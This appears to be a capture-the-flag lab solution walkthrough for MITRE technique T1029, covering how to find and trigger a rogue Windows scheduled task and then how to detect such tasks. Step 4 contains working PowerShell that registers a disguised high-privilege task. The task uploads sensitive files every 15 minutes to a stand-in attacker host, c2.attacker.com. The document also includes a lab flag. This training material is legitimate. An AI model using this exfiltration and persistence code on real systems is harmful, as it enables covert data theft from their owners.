# T1029 – Scheduled Transfer | Solution Walkthrough
**Difficulty:** Easy | **OS:** Windows | **MITRE:** T1029

## Step 1 – Find the Rogue Task
```powershell
Get-ScheduledTask | Where-Object {$_.TaskName -like "*Sync*" -or $_.TaskName -like "*Update*"} |
    Format-Table TaskName, State, TaskPath
# WindowsDataSync  Ready  \
```

## Step 2 – Examine the Task
```powershell
Export-ScheduledTask -TaskName "WindowsDataSync"
# Action: powershell.exe — Get-Content 'C:\ProgramData\sensitive\data.txt' | Out-File ...
# Trigger: Repeating every 5 minutes
```

## Step 3 – Trigger Manually
```powershell
Start-ScheduledTask "WindowsDataSync"
Start-Sleep 2
Get-Content "C:\Users\Public\scheduled_exfil.txt"
# HACKTIFY{SCHEDULED_TRANSFER_<hostname>}
```

## Step 4 – Create Your Own Scheduled Exfil
```powershell
# Exfil every 15 min to a "cloud endpoint":
$a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument `
    "-NonInteractive -Command `"(New-Object Net.WebClient).UploadString('http://c2.attacker.com/collect',(Get-Content 'C:\sensitive\*.txt' -Raw))`""
$t = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) -Once -At (Get-Date)
Register-ScheduledTask -TaskName "WindowsTelemetry" -Action $a -Trigger $t -RunLevel Highest
```

## Detection
- **Event ID 4698** — Scheduled task created
- `schtasks /query /fo LIST /v` — list all tasks with details
- Alert on tasks running `powershell.exe` with network calls or file reads
